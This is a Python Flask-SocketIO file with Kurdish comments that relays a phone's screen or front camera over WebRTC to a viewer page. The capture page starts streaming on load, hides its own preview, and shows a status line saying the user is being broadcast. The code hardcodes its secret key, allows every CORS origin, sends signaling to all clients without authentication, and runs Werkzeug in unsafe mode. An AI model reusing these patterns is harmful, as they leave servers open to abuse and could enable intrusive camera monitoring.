import os
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'webrtc_stream_secure_key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# 1. لاپەرێ سەرەکی (بینەر بتنێ بێ QR و بێ لینک)
VIEWER_HTML = """
<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Low-Latency Viewer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        body { 
            font-family: system-ui, -apple-system, sans-serif; 
            background: #010409; 
            color: white; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px;
            box-sizing: border-box;
        }
        .box { 
            width: 420px; 
            height: 750px; 
            max-height: 90vh; 
            border: 2px solid #30363d; 
            border-radius: 20px; 
            overflow: hidden; 
            background: #000; 
            box-shadow: 0 0 35px rgba(46, 160, 67, 0.2); 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video { 
            width: 100%; 
            height: 100%; 
            object-fit: contain; 
        }
    </style>
</head>
<body>
    <div class="box">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <script>
        const socket = io();
        let peerConnection;

        const rtcConfig = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        socket.on('offer', (id, description) => {
            peerConnection = new RTCPeerConnection(rtcConfig);
            
            peerConnection.ontrack = (event) => {
                document.getElementById('remoteVideo').srcObject = event.streams[0];
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('candidate', id, event.candidate);
                }
            };

            peerConnection.setRemoteDescription(description)
                .then(() => peerConnection.createAnswer())
                .then(sdp => peerConnection.setLocalDescription(sdp))
                .then(() => {
                    socket.emit('answer', id, peerConnection.localDescription);
                });
        });

        socket.on('candidate', (id, candidate) => {
            peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
        });

        socket.on('connect', () => {
            socket.emit('watcher');
        });
    </script>
</body>
</html>
"""

# 2. لاپەرێ مۆبایلێ (تەنێ تێکستێ "تو یێ ل بن پەخشی دا" و کارکرنا ئۆتۆماتیک)
PHONE_HTML = """
<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Source</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        body { 
            font-family: system-ui, -apple-system, sans-serif; 
            background: #0d1117; 
            color: #c9d1d9; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
            text-align: center;
        }
        #status { 
            font-weight: 700; 
            font-size: 24px; 
            color: #2ea043; 
        }
        video { display: none !important; }
    </style>
</head>
<body>
    <div id="status">ل هیڤیا دەستپێکرنێ...</div>
    <video id="v" autoplay playsinline muted></video>

    <script>
        const socket = io();
        let peerConnection;
        let localStream;

        const rtcConfig = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        async function initStream() {
            const status = document.getElementById('status');
            try {
                const constraints = {
                    video: {
                        width: { ideal: 640, max: 854 },
                        height: { ideal: 360, max: 480 },
                        frameRate: { ideal: 15, max: 20 }
                    },
                    audio: false
                };

                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                    localStream = await navigator.mediaDevices.getDisplayMedia(constraints);
                } else if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                } else {
                    throw new Error("ئامیر پشتگیرییا پەخشی ناکەت");
                }

                status.innerText = "تو یێ ل بن پەخشی دا";
                socket.emit('broadcaster');

            } catch (err) {
                status.innerText = "خەلەتی: " + err.message;
                status.style.color = "#da3633";
            }
        }

        socket.on('watcher', (id) => {
            peerConnection = new RTCPeerConnection(rtcConfig);
            
            if (localStream) {
                localStream.getTracks().forEach(track => {
                    const sender = peerConnection.addTrack(track, localStream);
                    try {
                        const parameters = sender.getParameters();
                        if (!parameters.encodings) parameters.encodings = [{}];
                        parameters.encodings[0].maxBitrate = 400000;
                        sender.setParameters(parameters);
                    } catch (e) {
                        console.warn(e);
                    }
                });
            }

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('candidate', id, event.candidate);
                }
            };

            peerConnection.createOffer({ offerToReceiveVideo: false, offerToReceiveAudio: false })
                .then(sdp => peerConnection.setLocalDescription(sdp))
                .then(() => {
                    socket.emit('offer', id, peerConnection.localDescription);
                });
        });

        socket.on('answer', (id, description) => {
            peerConnection.setRemoteDescription(description);
        });

        socket.on('candidate', (id, candidate) => {
            peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
        });

        window.addEventListener('DOMContentLoaded', initStream);
    </script>
</body>
</html>
"""

# ڕێڕەوا سەرەکی (بۆ بینینێ ل سەر لاپتۆپ/کۆمپیتەر)
@app.route('/')
def viewer():
    return render_template_string(VIEWER_HTML)

# ڕێڕەوا مۆبایلێ (پەخشکەر)
@app.route('/stream')
def stream_source():
    return render_template_string(PHONE_HTML)

@socketio.on('broadcaster')
def handle_broadcaster():
    emit('broadcaster', broadcast=True, include_self=False)

@socketio.on('watcher')
def handle_watcher():
    emit('watcher', request.sid, broadcast=True, include_self=False)

@socketio.on('offer')
def handle_offer(target_id, message):
    emit('offer', (target_id, message), broadcast=True, include_self=False)

@socketio.on('answer')
def handle_answer(target_id, message):
    emit('answer', (target_id, message), broadcast=True, include_self=False)

@socketio.on('candidate')
def handle_candidate(target_id, message):
    emit('candidate', (target_id, message), broadcast=True, include_self=False)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
